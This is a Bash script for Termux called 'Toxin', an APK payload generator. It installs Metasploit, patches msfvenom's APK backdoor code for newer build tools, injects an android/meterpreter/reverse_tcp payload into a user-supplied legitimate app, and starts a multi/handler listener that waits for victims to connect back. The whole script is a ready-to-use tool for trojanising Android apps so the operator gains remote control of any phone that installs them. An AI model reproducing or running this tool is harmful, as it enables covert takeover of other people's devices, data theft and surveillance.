#!/bin/bash

DEFAULT_PAYLOAD="android/meterpreter/reverse_tcp"
OUTPUT_DIR="$HOME/storage/shared/toxin" # Requires termux-setup-storage

# === Colors ===
normal=$(tput sgr0) # Use tput for better compatibility
red=$(tput setaf 1)
green=$(tput setaf 2)
orange=$(tput setaf 3) # Yellow/Orange
blue=$(tput setaf 4)
aqua=$(tput setaf 6) # Cyan/Aqua
bold=$(tput bold)

# === Functions ===

function display_error() {
  echo "${bold}${red}[ERROR]${normal} ${red}$1${normal}" >&2
}

function display_warning() {
  echo "${bold}${orange}[WARN]${normal} ${orange}$1${normal}"
}

function display_info() {
  echo "${bold}${aqua}[INFO]${normal} ${aqua}$1${normal}"
}

function display_success() {
  echo "${bold}${green}[SUCCESS]${normal} ${green}$1${normal}"
}

function ascii_art() {
cat << EOF
${aqua}
_|_|_|_|_|    _|_|    _|      _|  _|_|_|  _|      _|
    _|      _|    _|    _|  _|      _|    _|_|    _|
    _|      _|    _|      _|        _|    _|  _|  _|
    _|      _|    _|    _|  _|      _|    _|    _|_|
    _|        _|_|    _|      _|  _|_|_|  _|      _|

   ----------- APK PAYLOAD GENERATOR -----------
                                    - By KSAURAJ
${normal}
EOF
}

# Check if a command exists
function command_exists() {
  command -v "$1" &> /dev/null
}

# Request storage permission if not already set up
function check_storage_permission() {
    if [ ! -d "$HOME/storage/shared" ]; then
        display_warning "Shared storage access not detected."
        display_info "Requesting storage permission..."
        termux-setup-storage
        # Give some time for the user to grant permission
        sleep 3
        if [ ! -d "$HOME/storage/shared" ]; then
            display_error "Storage permission not granted or failed. Output directory cannot be created."
            display_error "Please grant storage permission manually via Android settings and restart the script."
            exit 1
        fi
        display_success "Storage access seems configured."
    fi
    # Ensure output directory exists
    mkdir -p "$OUTPUT_DIR"
    if [ ! -d "$OUTPUT_DIR" ]; then
        display_error "Failed to create output directory: $OUTPUT_DIR"
        display_error "Check permissions or storage space."
        exit 1
    fi
}

# Configure apt to download packages in parallel (Termux default is serial).
# Called once per setup run; idempotent — writes a conf file apt reads on next invoke.
function tune_apt_parallelism() {
  local conf="$PREFIX/etc/apt/apt.conf.d/99toxin-parallel"
  [ -f "$conf" ] && return 0
  cat > "$conf" <<'CONF'
Acquire::Queue-Mode "host";
Acquire::http::Pipeline-Depth "10";
Acquire::http::No-Cache "false";
Acquire::Languages "none";
CONF
}

# Prefetch the metasploit installer in the background so its download overlaps
# with pkg install. Called from run_setup; sets METASPLOIT_PREFETCH_PID.
function prefetch_metasploit_installer() {
  local installer="$PREFIX/tmp/metasploit.sh"
  local url="https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh"
  ( curl -fsSL "$url" -o "$installer" 2>/dev/null ) &
  METASPLOIT_PREFETCH_PID=$!
}

# Refresh package index only if it's stale (>6h old) — saves ~20-40s on repeat runs.
function pkg_update_if_stale() {
  local lists="$PREFIX/var/lib/apt/lists"
  local stamp="$lists/partial"
  # If lists dir is missing or mtime older than 6h, refresh.
  if [ ! -d "$lists" ] || [ -z "$(find "$lists" -maxdepth 1 -type f -mmin -360 2>/dev/null | head -1)" ]; then
    display_info "Refreshing package index..."
    pkg update -y >/dev/null 2>&1 || { display_error "pkg update failed."; return 1; }
  else
    display_info "Package index is fresh, skipping update."
  fi
  return 0
}

# Install required packages using apt (with parallelism enabled)
function install_packages() {
  local missing_pkgs=()
  # Map "command to check" -> "package to install"
  # openjdk-21 is pulled in as an apktool dep; we check for `java` to detect it.
  local -A pkg_map=(
    [git]=git
    [wget]=wget
    [curl]=curl
    [tput]=ncurses-utils
    [java]=openjdk-21
    [aapt]=aapt
    [apktool]=apktool
    [apksigner]=apksigner
  )

  display_info "Checking required packages..."
  for cmd in "${!pkg_map[@]}"; do
    if ! command_exists "$cmd"; then
      missing_pkgs+=("${pkg_map[$cmd]}")
    fi
  done

  if [ ${#missing_pkgs[@]} -eq 0 ]; then
    display_success "All required packages are already installed."
    return 0
  fi

  display_warning "Missing packages: ${missing_pkgs[*]}"
  tune_apt_parallelism
  pkg_update_if_stale || return 1
  display_info "Installing packages in parallel..."
  # -o Debug::pkgAcquire::Worker=false keeps output clean; --no-install-recommends trims fetch size
  if ! pkg install --no-install-recommends "${missing_pkgs[@]}" -y; then
    display_error "Failed to install packages: ${missing_pkgs[*]}. Please install them manually."
    return 1
  fi
  display_success "Required packages installed."
  return 0
}

# Install Metasploit Framework using the community installer.
# Termux dropped the `metasploit` package in 2021; the maintained community
# installer at gushmazuko/metasploit_in_termux is the standard replacement.
# If prefetch_metasploit_installer was called earlier, we wait for and reuse it.
function install_metasploit() {
  if command_exists msfconsole && msfvenom --list formats >/dev/null 2>&1; then
    display_success "Metasploit Framework is already installed and functional."
    apply_msfvenom_patches
    return 0
  fi

  local installer="$PREFIX/tmp/metasploit.sh"
  local installer_url="https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh"

  # If a background prefetch is running, wait for it to finish.
  if [ -n "${METASPLOIT_PREFETCH_PID:-}" ]; then
    display_info "Waiting for prefetched Metasploit installer..."
    wait "$METASPLOIT_PREFETCH_PID" 2>/dev/null
    unset METASPLOIT_PREFETCH_PID
  fi

  # Fallback: if prefetch failed or wasn't started, download now.
  if [ ! -s "$installer" ]; then
    display_info "Downloading Metasploit installer (gushmazuko/metasploit_in_termux)..."
    if ! curl -fsSL "$installer_url" -o "$installer"; then
      display_error "Failed to download the Metasploit installer."
      display_error "Manual install: curl -LO $installer_url && bash metasploit.sh"
      return 1
    fi
  fi

  # Ruby 3.4.0 nokogiri fix (const VALUE klass -> VALUE klass in rbasic.h).
  # Without this, nokogiri fails to compile with -Wdefault-const-init-field-unsafe
  # and the bundle install cascades into a broken msfvenom.
  find "$PREFIX/include" -name rbasic.h -exec \
    sed -i 's/const VALUE klass;/VALUE klass;/g' {} + 2>/dev/null

  chmod +x "$installer"
  display_info "Running Metasploit installer... (~15-45 min, ~1.5 GB — grab a coffee)"
  bash "$installer"
  local exit_status=$?
  rm -f "$installer"

  if command_exists msfconsole && msfvenom --list formats >/dev/null 2>&1; then
    display_success "Metasploit Framework installed successfully."
    apply_msfvenom_patches
    return 0
  else
    display_error "Metasploit installer finished (status: $exit_status) but msfvenom is not functional."
    display_error "Common causes: (a) rbasic.h patch didn't stick, (b) bundle install failed on nokogiri."
    display_error "Retry: bash $installer_url"
    return 1
  fi
}

# Patch msfvenom's APK backdoor module for modern apksigner/apktool output.
# Upstream metasploit-framework as of the maintainer's last check hasn't been updated for:
#   1. apksigner "V2 Signer:" / "V3.0 Signer:" prefix (regex only matched "Signer #N")
#   2. apktool 3.x removed --only-main-classes flag (now the default)
# Both are safe idempotent seds — re-runs are no-ops.
function apply_msfvenom_patches() {
  local apk_rb="$PREFIX/opt/metasploit-framework/lib/msf/core/payload/apk.rb"
  [ -f "$apk_rb" ] || return 0

  # Patch 1: broaden cert DN regex to accept "V2 Signer:" / "V3.0 Signer:" formats
  if ! grep -q 'V\\d+(?:\\.\\d+)? Signer:?' "$apk_rb"; then
    sed -i 's|scan(/\^Signer #\\d+ certificate DN: (.\+)\$/)|scan(/^(?:Signer #\\d+\|V\\d+(?:\\.\\d+)? Signer:?) certificate DN: (.+)$/)|' "$apk_rb"
    display_info "Patched msfvenom cert DN parser (V2/V3 apksigner)."
  fi

  # Patch 2: drop --only-main-classes flag (removed in apktool 3.x; default behavior now)
  if grep -q "'apktool', 'd'.*'--only-main-classes'" "$apk_rb"; then
    sed -i "s/, '--only-main-classes'//" "$apk_rb"
    display_info "Patched msfvenom apktool invocation (apktool 3.x compat)."
  fi
}

# Run the full setup process — non-interactive fast path.
function run_setup() {
  ascii_art
  display_info "Starting setup (parallel mode)..."

  check_storage_permission

  # Kick off metasploit installer download in the background so it overlaps
  # with pkg install; we'll wait on it inside install_metasploit.
  prefetch_metasploit_installer

  if ! install_packages; then
    display_error "Package installation failed."
    # Reap the prefetch before bailing.
    [ -n "${METASPLOIT_PREFETCH_PID:-}" ] && kill "$METASPLOIT_PREFETCH_PID" 2>/dev/null
    exit 1
  fi

  install_metasploit || display_warning "Metasploit setup failed; payload/listener won't work until fixed."

  display_success "Setup complete."
}

# Get LHOST from user
function get_lhost() {
  local lhost_val=""
  while [ -z "$lhost_val" ]; do
    read -rp "${aqua}[?] Enter LHOST (Your IP Address): ${normal}" lhost_val
    if [ -z "$lhost_val" ]; then
      display_warning "LHOST cannot be empty." >&2
    fi
  done
  echo "$lhost_val"
}

# Get LPORT from user
function get_lport() {
  local lport_val=""
  while true; do
    read -rp "${aqua}[?] Enter LPORT (e.g., 4444): ${normal}" lport_val
    if [[ "$lport_val" =~ ^[0-9]+$ ]] && [ "$lport_val" -gt 0 ] && [ "$lport_val" -le 65535 ]; then
      break
    else
      display_warning "Invalid LPORT. Please enter a number between 1 and 65535." >&2
    fi
  done
  echo "$lport_val"
}

# Get Original APK path from user
function get_original_apk() {
  local apk_path=""
  while true; do
    # Use read -e for path autocompletion if available
    read -e -rp "${aqua}[?] Enter path to ORIGINAL APK file: ${normal}" apk_path
    # Expand ~ to home directory
    apk_path="${apk_path/#\~/$HOME}"
    if [ -z "$apk_path" ]; then
      display_warning "APK path cannot be empty." >&2
    elif [ ! -f "$apk_path" ]; then
      display_warning "File not found: $apk_path" >&2
    elif [[ "${apk_path##*.}" != "apk" ]]; then
       display_warning "File does not seem to be an APK (extension is not .apk)." >&2
    else
      break
    fi
  done
  echo "$apk_path"
}

# Get desired output APK name
function get_output_apk_name() {
  local output_name=""
  while [ -z "$output_name" ]; do
    read -rp "${aqua}[?] Enter desired name for the OUTPUT APK (e.g., modified_app.apk): ${normal}" output_name
    if [ -z "$output_name" ]; then
      display_warning "Output name cannot be empty." >&2
    elif [[ "$output_name" != *.apk ]]; then
       # Append .apk if missing
       output_name="${output_name}.apk"
       display_info "Appending .apk extension. Output name: $output_name" >&2
    fi
  done
  echo "$output_name"
}

# Generate payload using msfvenom -x (with warnings)
function generate_payload() {
  local lhost=$1
  local lport=$2
  local original_apk=$3
  local output_apk_name=$4
  local payload_type=$DEFAULT_PAYLOAD # Use the default for now
  local output_path="$OUTPUT_DIR/$output_apk_name"

  clear
  ascii_art
  display_info "Payload Type: $payload_type"
  display_info "LHOST: $lhost"
  display_info "LPORT: $lport"
  display_info "Original APK: $original_apk"
  display_info "Output Path: $output_path"
  echo ""
  display_warning "Using 'msfvenom -x' to embed the payload."
  display_warning "This method is often UNRELIABLE with modern apps and may fail or create a non-functional APK."
  display_warning "Consider manual decompilation/injection/recompilation for better results."
  echo ""
  read -rp "${orange}[?] Continue with this method? [Y/n]: ${normal}" confirm
  if [[ "$confirm" =~ ^[Nn]$ ]]; then
      display_info "Payload generation cancelled."
      return 1
  fi

  display_info "Starting Metasploit (msfvenom)... this might take some time."

  # Execute msfvenom and capture exit status
  msfvenom -x "$original_apk" -p "$payload_type" LHOST="$lhost" LPORT="$lport" -o "$output_path"
  local exit_status=$?

  echo ""
  if [ $exit_status -eq 0 ] && [ -f "$output_path" ] && [ -s "$output_path" ]; then
    # Check if file exists and is not empty
    display_success "Payload generation command finished successfully."
    display_success "Modified APK saved to: $output_path"
    display_info "Remember to sign the APK if needed, although msfvenom often handles basic signing."
    display_warning "Test the generated APK thoroughly!"
  else
    display_error "Payload generation FAILED (msfvenom exit status: $exit_status)."
    if [ -f "$output_path" ]; then
        display_warning "An output file was created but might be corrupted or empty."
        # Optionally remove the failed attempt: rm "$output_path"
    fi
    display_error "Possible reasons: Incompatible original APK, anti-tampering mechanisms, incorrect LHOST/LPORT, Metasploit issue."
    display_error "Try a different (simpler, older) original APK or use manual methods."
    return 1
  fi
  return 0
}

# Start Metasploit listener
function start_listener() {
  local lhost=$1
  local lport=$2
  local payload_type=$DEFAULT_PAYLOAD # Use the default

  clear
  ascii_art
  display_info "Starting Metasploit listener (msfconsole)..."
  display_info "Payload: $payload_type"
  display_info "LHOST: $lhost"
  display_info "LPORT: $lport"
  echo ""
  display_info "Waiting for incoming connection..."

  # Check if msfconsole exists
  if ! command_exists msfconsole; then
      display_error "msfconsole command not found. Please run setup (option 3) or install Metasploit manually."
      return 1
  fi

  msfconsole -q -x "use multi/handler; set PAYLOAD $payload_type; set LHOST $lhost; set LPORT $lport; exploit -j -z"
  # -q quiet start
  # -j run as job
  # -z don't interact after session established (optional, keeps handler running)

  local exit_status=$?
  if [ $exit_status -ne 0 ]; then
      display_error "msfconsole exited with an error (status: $exit_status)."
  fi
  display_info "Listener stopped."
}

# Update the script from GitHub
function update_script() {
  display_info "Attempting to update Toxin from GitHub..."
  local script_path="$PREFIX/bin/toxin"
  local temp_script="$PREFIX/tmp/toxin.tmp"
  local repo_url="https://raw.githubusercontent.com/ksauraj/toxin/master/toxin"

  # Download the latest version
  if curl -fsSL "$repo_url" -o "$temp_script"; then
    # Compare the downloaded script with the current one
    if cmp -s "$script_path" "$temp_script"; then
      display_success "You already have the latest version."
      rm "$temp_script"
    else
      display_info "New version found. Installing..."
      # Make the temp script executable (needed for potential self-execution if update logic changes)
      chmod +x "$temp_script"
      # Replace the old script
      if mv "$temp_script" "$script_path"; then
        display_success "Toxin updated successfully. Please restart the script."
        exit 0 # Exit after successful update
      else
        display_error "Failed to replace the old script file. Check permissions."
        rm "$temp_script" # Clean up temp file on failure
        return 1
      fi
    fi
  else
    display_error "Failed to download the update. Check your internet connection or the repository URL."
    # Clean up temp file if it exists from a partial download
    [ -f "$temp_script" ] && rm "$temp_script"
    return 1
  fi
}

